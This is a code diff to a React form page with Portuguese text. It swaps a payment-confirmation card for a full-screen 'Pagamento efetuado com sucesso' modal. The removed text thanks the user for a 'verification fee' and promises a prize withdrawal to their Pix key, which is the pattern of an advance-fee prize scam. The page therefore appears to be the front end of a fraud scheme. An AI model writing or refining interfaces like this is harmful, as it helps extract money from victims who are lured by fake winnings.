@@ -268,18 +268,22 @@ function FormularioPage() {
 
       {paid && (
         <div
-          id="qr-card"
-          className="mt-6 rounded-md border border-green-500/40 bg-green-50 p-6 text-center animate-in fade-in"
+          role="dialog"
+          aria-live="polite"
+          className="fixed inset-0 z-50 flex items-center justify-center bg-background/80 p-6 backdrop-blur-sm animate-in fade-in"
         >
-          <CheckCircle2 className="mx-auto h-12 w-12 text-green-600" />
-          <h2 className="mt-3 text-xl font-extrabold text-green-700">Pagamento confirmado!</h2>
-          <p className="mt-2 text-sm text-green-800">
-            Recebemos sua taxa de verificação. Seu saque de{" "}
-            <b>R$ {premio.toLocaleString("pt-BR")}</b> será processado em até 7 dias úteis na chave
-            Pix informada.
-          </p>
+          <div className="flex max-w-sm flex-col items-center rounded-2xl border border-green-500/40 bg-white p-8 text-center shadow-xl">
+            <div className="flex h-20 w-20 items-center justify-center rounded-full bg-green-100 animate-in zoom-in duration-500">
+              <CheckCircle2 className="h-14 w-14 text-green-600 animate-in zoom-in duration-700" />
+            </div>
+            <h2 className="mt-4 text-2xl font-extrabold text-green-700 animate-in fade-in slide-in-from-bottom-2 duration-500">
+              Pagamento efetuado com sucesso
+            </h2>
+            <p className="mt-2 text-sm text-muted-foreground">Redirecionando...</p>
+          </div>
         </div>
       )}
+
     </div>
   );
 }
